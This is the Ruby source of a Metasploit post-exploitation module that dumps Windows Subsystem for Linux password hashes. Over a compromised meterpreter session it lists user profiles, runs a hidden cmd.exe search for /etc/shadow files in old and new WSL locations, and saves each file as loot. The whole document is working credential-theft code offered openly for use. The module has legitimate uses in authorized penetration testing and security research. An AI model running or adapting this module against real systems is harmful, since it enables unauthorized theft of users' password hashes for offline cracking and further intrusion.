##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather Dump Password Hashes for Windows Subsystem for Linux',
        'Description'   => %q{
          This module extracts the hashed password stored in 
          /etc/shadow files from Windows Subsystem for Linux.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Antoine Cervoise'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def run
    paths = []
    paths = enum_users
    check_old_subsystem(paths)
    check_new_subsystem(paths)
  end

  def check_old_subsystem(paths)
    paths.each do |path|
      username = path.split("\\")[2]
      print_status("Check for old WSL path for #{username}")
      path = path + "\\..\\Local\\lxfs\\rootfs\\etc\\shadow"
 
      if exist?(path)
        print_status("Shadow file found here: #{path}")
        shadow_file = read_file(path)  
        stored_path = store_loot("#{username}.old-WSL.shadow", 'text/plain', session, shadow_file, "#{username}.old-wsl.shadow", path)
        print_good("WSL (old one) Shadow saved in: #{stored_path.to_s}")
      else
        print_error("No old subsystem found for this user")
      end
    end
  end

  def check_new_subsystem(paths)
    paths.each do |path|
      username = path.split("\\")[2]
      print_status("Check for WSL path for #{username}")
      path = path + "\\..\\Local\\Packages\\"
      print_status("Profile: #{path}")
      r = session.sys.process.execute("cmd.exe /c " + "dir /b /s " + path + "| findstr /i \"etc\\shadow\"", nil, {'Hidden' => true, 'Channelized' => true})
       
      shadowfiles = []
      while(d = r.channel.read)
        shadowfiles = d	   
      end
      r.channel.close
      r.close
      
      shadowfiles.split("\r\n").each do |shadow|   
        if shadow[-1] != "-"
          print_status("Shadow file found here: #{shadow}")          
          shadow_file = read_file(shadow)
          wsl_system = shadow.split("\\")[6]
          stored_path = store_loot("#{username}.#{wsl_system}.shadow", 'text/plain', session, shadow_file, "#{username}.#{wsl_system}.shadow", shadow)
          print_good("WSL #{wsl_system} Shadow saved in: #{stored_path.to_s}")
        end
      end
    end
  end

  def enum_users
    paths = []
    id = session.sys.config.getenv('USERNAME')
    
    if id.nil? or id.empty?
      print_error("Session #{datastore['SESSION']} is not responding")
      return
    end

    print_status("Searching every possible account on the target system")
    grab_user_profiles().each do |user|
      next if user['AppData'].nil?
      dir = user['AppData']
      paths << dir if dir
    end

    return paths
  end

end
